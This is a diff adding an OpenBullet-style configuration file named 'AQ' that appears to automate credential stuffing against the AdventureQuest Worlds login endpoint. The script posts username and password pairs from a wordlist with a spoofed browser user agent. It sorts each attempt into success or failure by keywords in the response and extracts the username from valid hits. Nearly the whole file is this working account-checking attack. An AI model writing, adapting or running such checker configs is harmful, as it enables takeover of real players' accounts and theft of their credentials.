@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "AQ",
+  "SuggestedBots": 1,
+  "LastModified": "2019-07-02T19:50:18.998869+03:00",
+  "AdditionalInfo": "",
+  "Author": "blacked#5101",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://game.aq.com/game/cf-userlogin.asp?ran=0.6884313298801106" 
+  CONTENT "pass=<PASS>&pwd=<PASS>&unm=<USER>&option=0&user=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<login bSuccess=\"1\" " 
+  KEYCHAIN Failure OR 
+    KEY "<login><bSuccess>0</bSuccess><" 
+PARSE "<SOURCE>" LR "unm=\"" "\" " -> VAR "Username" 
